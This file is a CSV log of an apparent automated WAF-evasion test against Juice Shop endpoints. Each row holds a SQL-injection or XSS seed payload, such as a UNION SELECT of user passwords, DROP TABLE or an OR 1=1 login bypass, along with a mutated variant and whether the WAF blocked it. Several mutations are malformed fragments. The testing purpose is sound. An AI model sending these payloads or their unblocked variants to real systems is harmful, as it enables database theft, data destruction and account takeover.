wave_id,payload_id,attack_type,seed_payload,mutated_payload,endpoint,status_code,blocked,matched_rule_id,timestamp
1,w1-sqli-05-1,sqli,"x' UNION SELECT id,email,password,'1','1','1','1','1' FROM Users--",[,/rest/products/search,200,False,,2026-08-09T19:03:02.030731+00:00
1,w1-sqli-05-2,sqli,"x' UNION SELECT id,email,password,'1','1','1','1','1' FROM Users--","x' union select id,email,password,'1','1','1','1','1' from users--"",",/rest/products/search,403,True,949110,2026-08-09T19:03:02.039357+00:00
1,w1-sqli-05-3,sqli,"x' UNION SELECT id,email,password,'1','1','1','1','1' FROM Users--","UNION SELECT id,email,password,'1','1','1','1','1' FROM Users --"",",/rest/products/search,403,True,949110,2026-08-09T19:03:02.042894+00:00
1,w1-sqli-05-4,sqli,"x' UNION SELECT id,email,password,'1','1','1','1','1' FROM Users--","x\032union select id,email,password,'\01', '\01', '\01', '\01', '\01' from users --"",",/rest/products/search,403,True,949110,2026-08-09T19:03:02.045537+00:00
1,w1-sqli-05-5,sqli,"x' UNION SELECT id,email,password,'1','1','1','1','1' FROM Users--","x' \025union select id,email,password,\x01,\x01,\x01,\x01,\x01 from users",/rest/products/search,403,True,949110,2026-08-09T19:03:02.047990+00:00
1,w1-sqli-05-6,sqli,"x' UNION SELECT id,email,password,'1','1','1','1','1' FROM Users--",],/rest/products/search,200,False,,2026-08-09T19:03:02.050461+00:00
1,w1-sqli-06-1,sqli,'; DROP TABLE Products;--,"[""'; DROP T\r able P\\roducts;-- "", ""DROP\\s+TabeL PrOducTs;"", ""/*'; DROP TABLE Products;-- */"", ""'\x22\x53\x44\x52\x4f\x50 DROPTABLE Products\x22;-- ""]",/rest/products/search,403,True,949110,2026-08-09T19:03:02.058289+00:00
1,w1-sqli-06-2,sqli,'; DROP TABLE Products;--,'; DroP tAble PrOdUcTs;--,/rest/products/search,403,True,949110,2026-08-09T19:03:02.061905+00:00
1,w1-sqli-06-3,sqli,'; DROP TABLE Products;--,/*'; drop table products;--*/,/rest/products/search,403,True,949110,2026-08-09T19:03:02.064422+00:00
1,w1-sqli-06-4,sqli,'; DROP TABLE Products;--,URLencode(';drop table products;--'),/rest/products/search,403,True,949110,2026-08-09T19:03:02.066760+00:00
1,w1-sqli-06-5,sqli,'; DROP TABLE Products;--,'\x3b DROP TAbLe ProDuCts \x3b--',/rest/products/search,500,False,,2026-08-09T19:03:02.069415+00:00
1,w1-sqli-07-1,sqli,1' ORDER BY 10--,"[""1%27+ORDER+BY+10+//"",""1''%2f*ORDER*+BY*10*//*"",'1\45\u0027 order by 10 --',""1'%0D%0A+order+by+10+-/*""]",/rest/products/search,403,True,949110,2026-08-09T19:03:02.077233+00:00
1,w1-sqli-07-2,sqli,1' ORDER BY 10--,"1"" OR ""1""='1",/rest/products/search,403,True,949110,2026-08-09T19:03:02.080891+00:00
1,w1-sqli-07-3,sqli,1' ORDER BY 10--,1' OR '1'='1,/rest/products/search,403,True,949110,2026-08-09T19:03:02.083618+00:00
1,w1-sqli-07-4,sqli,1' ORDER BY 10--,"1"" or ""1""=""1",/rest/products/search,403,True,949110,2026-08-09T19:03:02.085905+00:00
1,w1-sqli-07-5,sqli,1' ORDER BY 10--,1'' or ''='',/rest/products/search,200,False,,2026-08-09T19:03:02.087968+00:00
1,w1-sqli-08-1,sqli,' OR 1=1;--,%20or%201%3D1;%00,/rest/user/login,403,True,949110,2026-08-09T19:03:02.094928+00:00
1,w1-sqli-08-2,sqli,' OR 1=1;--,OR 1 = 1; --,/rest/user/login,401,False,,2026-08-09T19:03:02.097505+00:00
1,w1-sqli-08-3,sqli,' OR 1=1;--,OR1=1;--,/rest/user/login,401,False,,2026-08-09T19:03:02.112011+00:00
1,w1-sqli-08-4,sqli,' OR 1=1;--,' or 1=1;--;,/rest/user/login,403,True,949110,2026-08-09T19:03:02.128201+00:00
1,w1-xss-01-1,xss,<script>alert(1)</script>,"[""\<scriPt\>alErT(1)\<\/sCriPt\>"", ""<scr""+""ipt"">alert(1)<\/sc""+""ript"", ""&lt;script&gt;alert(1)&lt;/script&gt;"", ""<s CriPt >alert(1)<\/ s C r i P t >""]",/rest/products/search,403,True,949110,2026-08-09T19:03:02.131477+00:00
1,w1-xss-01-2,xss,<script>alert(1)</script>,<sCripT>alErT(1)</sCripT>,/rest/products/search,403,True,949110,2026-08-09T19:03:02.134422+00:00
1,w1-xss-01-3,xss,<script>alert(1)</script>,<SCRIPT><!--alert(1)--></SCRIPT>,/rest/products/search,403,True,949110,2026-08-09T19:03:02.137147+00:00
1,w1-xss-01-4,xss,<script>alert(1)</script>,%3cscript%3ealert(1)%3c/script%3e,/rest/products/search,403,True,949110,2026-08-09T19:03:02.139795+00:00
1,w1-xss-01-5,xss,<script>alert(1)</script>,(alert(1)),/rest/products/search,403,True,949110,2026-08-09T19:03:02.142384+00:00
1,w1-xss-02-1,xss,<img src=x onerror=alert(1)>,<iMg sRc=X OnErRoR=aLtErT(1)>,/rest/products/search,403,True,949110,2026-08-09T19:03:02.144491+00:00
1,w1-xss-02-2,xss,<img src=x onerror=alert(1)>,"<IMG SRC=""x"" ONERROR=//aLert(1)//>",/rest/products/search,403,True,949110,2026-08-09T19:03:02.146991+00:00
1,w1-xss-02-3,xss,<img src=x onerror=alert(1)>,<img src='X' onerrOr='alErT(1)'/>,/rest/products/search,403,True,949110,2026-08-09T19:03:02.149598+00:00
1,w1-xss-02-4,xss,<img src=x onerror=alert(1)>,<ImAg SrC='x' oNerRoR=aLtEr(1)>,/rest/products/search,403,True,949110,2026-08-09T19:03:02.151877+00:00
1,w1-xss-02-5,xss,<img src=x onerror=alert(1)>,<iMg sRc=X OnErRoR=aLert(1)>,/rest/products/search,403,True,949110,2026-08-09T19:03:02.154081+00:00
1,w1-xss-02-6,xss,<img src=x onerror=alert(1)>,'<img src=x onerror=alert(1)>',/rest/products/search,403,True,949110,2026-08-09T19:03:02.156224+00:00
1,w1-xss-03-1,xss,<svg/onload=alert(1)>,<SVG/onLoad=alert(1)>,/rest/products/search,403,True,949110,2026-08-09T19:03:02.158816+00:00
1,w1-xss-03-2,xss,<svg/onload=alert(1)>,<sVg OnLoAd=alert(1)>,/rest/products/search,403,True,949110,2026-08-09T19:03:02.161036+00:00
1,w1-xss-03-3,xss,<svg/onload=alert(1)>,"<SCRIPT>document.addEventListener('onload', function(){ alert(1) });</SCRIPT>",/rest/products/search,403,True,949110,2026-08-09T19:03:02.163174+00:00
1,w1-xss-03-4,xss,<svg/onload=alert(1)>,<img src='x' onlOaD=alert(1)>,/rest/products/search,403,True,949110,2026-08-09T19:03:02.165791+00:00
1,w1-xss-04-1,xss,"<iframe src=""javascript:alert(`xss`)"">","<iFrAmE sRc=""jAvAsCrIpt:AlErT(""xSS"")""></",/api/Feedbacks,403,True,949110,2026-08-09T19:03:02.167868+00:00
2,w2-sqli-01-1,sqli,' OR 1=1--, OR 1=1 /* comment */ --,/rest/user/login,401,False,,2026-08-09T19:06:56.587769+00:00
2,w2-sqli-01-2,sqli,' OR 1=1--,or 1=1 --,/rest/user/login,401,False,,2026-08-09T19:06:56.601159+00:00
2,w2-sqli-01-3,sqli,' OR 1=1--,%22%20or%201=1%20-%2f- ,/rest/user/login,401,False,,2026-08-09T19:06:56.616847+00:00
2,w2-sqli-01-4,sqli,' OR 1=1--,' or 1=1 --,/rest/user/login,403,True,949110,2026-08-09T19:06:56.635426+00:00
2,w2-sqli-02-1,sqli,' OR '1'='1, OR %27%27%3D%271%27%3D%271 ,/rest/user/login,401,False,,2026-08-09T19:06:56.638864+00:00
2,w2-sqli-02-2,sqli,' OR '1'='1, OR /* '1'='1 */ ,/rest/user/login,500,False,,2026-08-09T19:06:56.652290+00:00
2,w2-sqli-02-3,sqli,' OR '1'='1,' OR }elseif(1==1){,/rest/user/login,403,True,949110,2026-08-09T19:06:56.671961+00:00
2,w2-sqli-02-4,sqli,' OR '1'='1, OR 1=1 ,/rest/user/login,401,False,,2026-08-09T19:06:56.675902+00:00
2,w2-sqli-03-1,sqli,admin@juice-sh.op'--,admin@juice-sh.op'--,/rest/user/login,403,True,949110,2026-08-09T19:06:56.689348+00:00
2,w2-sqli-03-2,sqli,admin@juice-sh.op'--,"aDmIn@JuIcE-sH.oP""--",/rest/user/login,403,True,949110,2026-08-09T19:06:56.692721+00:00
2,w2-sqli-03-3,sqli,admin@juice-sh.op'--,admin%40juice-sh.op%27--,/rest/user/login,403,True,949110,2026-08-09T19:06:56.696011+00:00
2,w2-sqli-03-4,sqli,admin@juice-sh.op'--,'aDmiN%40jUicE-sH.oP',/rest/user/login,500,False,,2026-08-09T19:06:56.698952+00:00
2,w2-sqli-04-1,sqli,') OR ('1'='1,"[""(') OR (']1['='1""], [""') oR ( ''1'' = '1'""], [""(') OR ([1]=([1])""), [""( ] ) O R ( [ 1 ] = [ 1 ] ""]""]",/rest/user/login,403,True,949110,2026-08-09T19:06:56.706775+00:00
2,w2-sqli-04-2,sqli,') OR ('1'='1,') OR (1=1,/rest/user/login,403,True,949110,2026-08-09T19:06:56.710546+00:00
2,w2-sqli-04-3,sqli,') OR ('1'='1,}) OR (1=1 /* comment */,/rest/user/login,401,False,,2026-08-09T19:06:56.713257+00:00
2,w2-sqli-04-4,sqli,') OR ('1'='1,) OR 1%3D1 URLENCODED,/rest/user/login,403,True,949110,2026-08-09T19:06:56.722231+00:00
2,w2-sqli-04-5,sqli,') OR ('1'='1,]) OR ( '1 '='1 /* hex encoded */ ,/rest/user/login,500,False,,2026-08-09T19:06:56.724797+00:00
2,w2-sqli-05-1,sqli,"x' UNION SELECT id,email,password,'1','1','1','1','1' FROM Users--",[,/rest/products/search,200,False,,2026-08-09T19:06:56.738896+00:00
2,w2-sqli-05-2,sqli,"x' UNION SELECT id,email,password,'1','1','1','1','1' FROM Users--","x' union select id,email,password,'1','1','1','1','1' from users --"",",/rest/products/search,403,True,949110,2026-08-09T19:06:56.756702+00:00
2,w2-sqli-05-3,sqli,"x' UNION SELECT id,email,password,'1','1','1','1','1' FROM Users--","UNION SELECT id,email,password,'1','1','1','1','1' FROM Users--"",",/rest/products/search,403,True,949110,2026-08-09T19:06:56.760443+00:00
2,w2-sqli-05-4,sqli,"x' UNION SELECT id,email,password,'1','1','1','1','1' FROM Users--","UNION SELECT id,email,password,''1,''1,''1,''1,''1'' FROM Users--;"",",/rest/products/search,403,True,949110,2026-08-09T19:06:56.763741+00:00
2,w2-sqli-05-5,sqli,"x' UNION SELECT id,email,password,'1','1','1','1','1' FROM Users--","x' UNION SELECT id,email,password,\\""1\"",""1""\"",""1""\"",""1""\"",""1""\ from users",/rest/products/search,403,True,949110,2026-08-09T19:06:56.766854+00:00
2,w2-sqli-05-6,sqli,"x' UNION SELECT id,email,password,'1','1','1','1','1' FROM Users--",],/rest/products/search,200,False,,2026-08-09T19:06:56.769316+00:00
2,w2-sqli-06-1,sqli,'; DROP TABLE Products;--,[,/rest/products/search,200,False,,2026-08-09T19:06:56.775727+00:00
2,w2-sqli-06-2,sqli,'; DROP TABLE Products;--,"; DROP TABLE Products; --"",",/rest/products/search,403,True,949110,2026-08-09T19:06:56.790084+00:00
2,w2-sqli-06-3,sqli,'; DROP TABLE Products;--,"DROP table PrODuCTS; --"",",/rest/products/search,403,True,949110,2026-08-09T19:06:56.792860+00:00
2,w2-sqli-06-4,sqli,'; DROP TABLE Products;--,"; drop table products; /* */"",",/rest/products/search,403,True,949110,2026-08-09T19:06:56.795511+00:00
2,w2-sqli-06-5,sqli,'; DROP TABLE Products;--,;DROP   T A B L E  p r o D u c t S ;,/rest/products/search,403,True,949110,2026-08-09T19:06:56.797854+00:00
2,w2-sqli-07-1,sqli,1' ORDER BY 10--,1' order by 10 --,/rest/products/search,403,True,949110,2026-08-09T19:06:56.800207+00:00
2,w2-sqli-07-2,sqli,1' ORDER BY 10--,"1"" ORder By 10 /*/",/rest/products/search,403,True,949110,2026-08-09T19:06:56.802819+00:00
2,w2-sqli-07-3,sqli,1' ORDER BY 10--,'1/ order by 10//,/rest/products/search,500,False,,2026-08-09T19:06:56.804917+00:00
2,w2-sqli-07-4,sqli,1' ORDER BY 10--,'1\ order by 10,/rest/products/search,500,False,,2026-08-09T19:06:56.811699+00:00
2,w2-sqli-08-1,sqli,' OR 1=1;--,[,/rest/user/login,401,False,,2026-08-09T19:06:56.825978+00:00
2,w2-sqli-08-2,sqli,' OR 1=1;--,"or 1=1;\x20\x20--"",",/rest/user/login,401,False,,2026-08-09T19:06:56.841786+00:00
2,w2-sqli-08-3,sqli,' OR 1=1;--,"OR 1 = 1 ; --"",",/rest/user/login,401,False,,2026-08-09T19:06:56.858265+00:00
2,w2-sqli-08-4,sqli,' OR 1=1;--,"\u004f\u0052 1=\u0001;\u002d\u002d"",",/rest/user/login,401,False,,2026-08-09T19:06:56.874521+00:00
2,w2-sqli-08-5,sqli,' OR 1=1;--,or 1 = 1;\n,/rest/user/login,401,False,,2026-08-09T19:06:56.891421+00:00
2,w2-sqli-08-6,sqli,' OR 1=1;--,],/rest/user/login,401,False,,2026-08-09T19:06:56.905648+00:00
2,w2-xss-01-1,xss,<script>alert(1)</script>,"[""<scriPt AlErT(1)</scriPt>"", ""<sCriPt>/* alert(1) */</sCriPt>"", ""<scr"" + ""ipt"" + "">alert(1)</sc"" + ""ript>"", ""<ScriPt>&#x61;&#x6c;&#x65;rt&#x28;1&#x29;</ScriPt>""]",/rest/products/search,403,True,949110,2026-08-09T19:06:56.920866+00:00
2,w2-xss-01-2,xss,<script>alert(1)</script>,<ScrIpT>AlErT(1)</ScRiPt>,/rest/products/search,403,True,949110,2026-08-09T19:06:56.924288+00:00
2,w2-xss-01-3,xss,<script>alert(1)</script>,<SCRIPT><!--alert(1)--></SCRIPT>,/rest/products/search,403,True,949110,2026-08-09T19:06:56.926747+00:00
2,w2-xss-01-4,xss,<script>alert(1)</script>,unescape('<a' + 'lert' + '(1)')</a>,/rest/products/search,500,False,,2026-08-09T19:06:56.929160+00:00
2,w2-xss-01-5,xss,<script>alert(1)</script>,&lt;scRipT&gt;alert(1)&lt;/scRiPT&gt;,/rest/products/search,403,True,949110,2026-08-09T19:06:56.936554+00:00
2,w2-xss-02-1,xss,<img src=x onerror=alert(1)>,"[""<iMg sRc=x OnErRoR=aLtEr(1)>"", ""<script>alert('1')</script><noscript><img src=x onerror='alert(1)'></noscript>"", ""unescape('%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E')"", ""'<scr""+""ipt>alert('1')</scr'+'ipt>'""]",/rest/products/search,403,True,949110,2026-08-09T19:06:56.939654+00:00
2,w2-xss-02-2,xss,<img src=x onerror=alert(1)>,<IMG SRC=X ONERROR=alert(1)>,/rest/products/search,403,True,949110,2026-08-09T19:06:56.942804+00:00
2,w2-xss-02-3,xss,<img src=x onerror=alert(1)>,&#x49;mg &#x53;Rc&#x3D;x &#x6f;nerr&#x6F;r=alert(1)>,/rest/products/search,403,True,949110,2026-08-09T19:06:56.945388+00:00
2,w2-xss-02-4,xss,<img src=x onerror=alert(1)>,<img src=x onErroR(alert(1))>,/rest/products/search,403,True,949110,2026-08-09T19:06:56.948395+00:00
2,w2-xss-03-1,xss,<svg/onload=alert(1)>,"[""<svg/onload=ALERT(1)>"",""<SVG/OnLoad=alert(1)>"",""&#x53;&#x76;&#x67;/onload=alert(1)"",""<scr"" + ""ipt>alert(1)</script>""]",/rest/products/search,403,True,949110,2026-08-09T19:06:56.950903+00:00
2,w2-xss-03-2,xss,<svg/onload=alert(1)>,"[""<sVg OnLoAd=\""AlErT(1)\"">"", ""<i>svg</i>/onload=<\* alert(1) \* />"", ""unescape('%3Csvg%3E%2Fonload%3Dalert(1)%3E')"", ""String.fromCharCode(60, 's', 118, 'v', 62, 'g', '/', 111, 'o', 110, 'n', 108, 'l', 111, 'o', 97, 'a', 116, 'd', '=', String.fromCharCode(34) + 'al' + 'e' + 'r' + 't' + String.fromCharCode(40) + '1' + String.fromCharCode(41) + String.fromCharCode(34))""]",/rest/products/search,403,True,949110,2026-08-09T19:06:56.953385+00:00
2,w2-xss-04-1,xss,"<iframe src=""javascript:alert(`xss`)"">","<iFrAmE sRc=""jAvAsCrIpt:AlErT('xss')""></iFramE>",/api/Feedbacks,403,True,949110,2026-08-09T19:06:56.956411+00:00
3,w3-sqli-01-1,sqli,' OR 1=1--, OR 1=1 --,/rest/user/login,401,False,,2026-08-09T19:10:39.950940+00:00
3,w3-sqli-01-2,sqli,' OR 1=1--, oR 1 = 1 --,/rest/user/login,401,False,,2026-08-09T19:10:39.967464+00:00
3,w3-sqli-01-3,sqli,' OR 1=1--,or 1 =1 --,/rest/user/login,401,False,,2026-08-09T19:10:39.985773+00:00
3,w3-sqli-01-4,sqli,' OR 1=1--,"[""'OR 1=1--', '%2f OR 1=1--', '&#x5c;OR 1=1--', ""OR\0401=1--""]",/rest/user/login,403,True,949110,2026-08-09T19:10:40.002609+00:00
3,w3-sqli-02-1,sqli,' OR '1'='1, OR 1=1 --,/rest/user/login,401,False,,2026-08-09T19:10:40.007102+00:00
3,w3-sqli-02-2,sqli,' OR '1'='1, oR '1'='1 #,/rest/user/login,500,False,,2026-08-09T19:10:40.021431+00:00
3,w3-sqli-02-3,sqli,' OR '1'='1,%5Cu%2fOR+1%3d1%22%2f,/rest/user/login,401,False,,2026-08-09T19:10:40.035234+00:00
3,w3-sqli-02-4,sqli,' OR '1'='1,'oR '1'='%271'%3D'1',/rest/user/login,403,True,949110,2026-08-09T19:10:40.052746+00:00
3,w3-sqli-03-1,sqli,admin@juice-sh.op'--,admin@juice-sh.op'--,/rest/user/login,403,True,949110,2026-08-09T19:10:40.056080+00:00
3,w3-sqli-03-2,sqli,admin@juice-sh.op'--,"admin""@juice-#sh/op'--",/rest/user/login,403,True,949110,2026-08-09T19:10:40.059957+00:00
3,w3-sqli-03-3,sqli,admin@juice-sh.op'--,admin@juice_sh.op'--,/rest/user/login,403,True,949110,2026-08-09T19:10:40.062944+00:00
3,w3-sqli-03-4,sqli,admin@juice-sh.op'--,"[""admin@juice-sh.op\"" -- "", ""aDmIn@\x6AuiCe-Sh.oP'-- ', ""ADMIN@juIcE-SH.Op--"", ""'admin@juic-e_sh.op'-- ""]",/rest/user/login,401,False,,2026-08-09T19:10:40.065533+00:00
3,w3-sqli-04-1,sqli,') OR ('1'='1,"[""%29%20OR%20%28%27%31%27%3D%271"", ""'or '1'='1 --"", "")] OR [1]='' or 1=1"", ""); OR (1=1) or sleep(0)=sleep(0)",/rest/user/login,403,True,949110,2026-08-09T19:10:40.073381+00:00
3,w3-sqli-04-2,sqli,') OR ('1'='1,"["") oR ( '1' = '1"", ""') oR (1=1 -- comment"", ""http://example.com/?%27+OR+%271%27=%271"", ""' OR (1=1 /* test */"")""]",/rest/user/login,403,True,949110,2026-08-09T19:10:40.076540+00:00
3,w3-sqli-05-1,sqli,"x' UNION SELECT id,email,password,'1','1','1','1','1' FROM Users--","[""%20UNION%20SELECT%20id,%20email,%20password,'%2F1','%2F1','%2F1','%2F1','%2F1'%20FROM%20Users-%22,",/rest/products/search,403,True,949110,2026-08-09T19:10:40.079187+00:00
3,w3-sqli-05-2,sqli,"x' UNION SELECT id,email,password,'1','1','1','1','1' FROM Users--","x' union select id,email,password,'1','1','1','1','1' from Users /*"",",/rest/products/search,403,True,949110,2026-08-09T19:10:40.081780+00:00
3,w3-sqli-05-3,sqli,"x' UNION SELECT id,email,password,'1','1','1','1','1' FROM Users--","UNION+SELECT+id,+email,+password,'1','1','1','1','1'+FROM+Users//"",",/rest/products/search,403,True,949110,2026-08-09T19:10:40.084196+00:00
3,w3-sqli-05-4,sqli,"x' UNION SELECT id,email,password,'1','1','1','1','1' FROM Users--","union SELECT id,email,password,'1','1','1','1','1' FROM Users#""]",/rest/products/search,403,True,949110,2026-08-09T19:10:40.086476+00:00
3,w3-sqli-06-1,sqli,'; DROP TABLE Products;--,[,/rest/products/search,200,False,,2026-08-09T19:10:40.088724+00:00
3,w3-sqli-06-2,sqli,'; DROP TABLE Products;--,"; DroP TaBlE PrOduCtS; --"",",/rest/products/search,403,True,949110,2026-08-09T19:10:40.096343+00:00
3,w3-sqli-06-3,sqli,'; DROP TABLE Products;--,"; -- DroP -- TaBlE -- PrOduCtS; --"",",/rest/products/search,200,False,,2026-08-09T19:10:40.099593+00:00
3,w3-sqli-06-4,sqli,'; DROP TABLE Products;--,"DROP\s+TABLE\s+Products;"",",/rest/products/search,200,False,,2026-08-09T19:10:40.113270+00:00
3,w3-sqli-06-5,sqli,'; DROP TABLE Products;--,\'; DROP TABLE Products;,/rest/products/search,403,True,949110,2026-08-09T19:10:40.132128+00:00
3,w3-sqli-06-6,sqli,'; DROP TABLE Products;--,],/rest/products/search,200,False,,2026-08-09T19:10:40.136898+00:00
3,w3-sqli-07-1,sqli,1' ORDER BY 10--,"[""1' order by 10 --"", ""'\x20ORDER BY 10--"", ""/*1'\x20ORDER BY 10--*/"", ""1’&lt;script&gt;ORDER BY 10&lt;/script&gt;""]",/rest/products/search,403,True,949110,2026-08-09T19:10:40.156995+00:00
3,w3-sqli-07-2,sqli,1' ORDER BY 10--,1' order by 10 /*,/rest/products/search,403,True,949110,2026-08-09T19:10:40.160633+00:00
3,w3-sqli-07-3,sqli,1' ORDER BY 10--,1\u0027 order by 10 -- ,/rest/products/search,403,True,949110,2026-08-09T19:10:40.163636+00:00
3,w3-sqli-07-4,sqli,1' ORDER BY 10--,1&#x27; order by 10 //,/rest/products/search,200,False,,2026-08-09T19:10:40.166100+00:00
3,w3-sqli-07-5,sqli,1' ORDER BY 10--,1&#039; order by 10 &#047;,/rest/products/search,200,False,,2026-08-09T19:10:40.175143+00:00
3,w3-sqli-08-1,sqli,' OR 1=1;--, OR 1=1; --,/rest/user/login,401,False,,2026-08-09T19:10:40.189441+00:00
3,w3-sqli-08-2,sqli,' OR 1=1;--, oR 1 = 1 ; --,/rest/user/login,401,False,,2026-08-09T19:10:40.207127+00:00
3,w3-sqli-08-3,sqli,' OR 1=1;--,' OR 1=1;--',/rest/user/login,403,True,949110,2026-08-09T19:10:40.220223+00:00
3,w3-sqli-08-4,sqli,' OR 1=1;--,' OR 1 = 1 ; --',/rest/user/login,403,True,949110,2026-08-09T19:10:40.223406+00:00
3,w3-xss-01-1,xss,<script>alert(1)</script>,<scrIpT>AlErT(1)</sCrIpT>,/rest/products/search,403,True,949110,2026-08-09T19:10:40.226683+00:00
3,w3-xss-01-2,xss,<script>alert(1)</script>,<ScRiPt> &#x61;&#x6c;&#x65;&#x72;&#x74;(1)</ScRiPt>,/rest/products/search,403,True,949110,2026-08-09T19:10:40.229260+00:00
3,w3-xss-01-3,xss,<script>alert(1)</script>,<sCript> // <![CDATA[ alert(1) ]]> </script>,/rest/products/search,403,True,949110,2026-08-09T19:10:40.232105+00:00
3,w3-xss-01-4,xss,<script>alert(1)</script>,<SCRIPT>alert('\u0001')</script>,/rest/products/search,403,True,949110,2026-08-09T19:10:40.234926+00:00
3,w3-xss-02-1,xss,<img src=x onerror=alert(1)>,<iMg sRC='x' oNError=aLtErT(1)>,/rest/products/search,403,True,949110,2026-08-09T19:10:40.237745+00:00
3,w3-xss-02-2,xss,<img src=x onerror=alert(1)>,<img SРС='x' оnErrоr=аlеrt(1)>,/rest/products/search,403,True,949110,2026-08-09T19:10:40.240233+00:00
3,w3-xss-02-3,xss,<img src=x onerror=alert(1)>,%u0063%u0069%u006d%u0067%20sRc=%22x%22%20oN%65rr%6f%72%65%72=%61%6C%65%72%74%28%31%29%20,/rest/products/search,403,True,949110,2026-08-09T19:10:40.242529+00:00
3,w3-xss-02-4,xss,<img src=x onerror=alert(1)>,"<img src=""x"" onerror=""alert(1)"">",/rest/products/search,403,True,949110,2026-08-09T19:10:40.245761+00:00
3,w3-xss-03-1,xss,<svg/onload=alert(1)>,<SVG/onLoad=alert(1)>,/rest/products/search,403,True,949110,2026-08-09T19:10:40.247932+00:00
3,w3-xss-03-2,xss,<svg/onload=alert(1)>,<i/g onlOaD=alert(1)>,/rest/products/search,403,True,949110,2026-08-09T19:10:40.250189+00:00
3,w3-xss-03-3,xss,<svg/onload=alert(1)>,%3Csvg%2Fonload%3Dalert%281%29%3E,/rest/products/search,403,True,949110,2026-08-09T19:10:40.252400+00:00
3,w3-xss-03-4,xss,<svg/onload=alert(1)>,'><scr ipt>alert(1)</scri pt>',/rest/products/search,403,True,949110,2026-08-09T19:10:40.254608+00:00
3,w3-xss-04-1,xss,"<iframe src=""javascript:alert(`xss`)"">",[,/api/Feedbacks,401,False,,2026-08-09T19:10:40.257219+00:00
3,w3-xss-04-2,xss,"<iframe src=""javascript:alert(`xss`)"">","<iFramE sRC=\""jAvAsCrIpT:AlErT('xSS')\""></iFramE>"",",/api/Feedbacks,403,True,949110,2026-08-09T19:10:40.261853+00:00
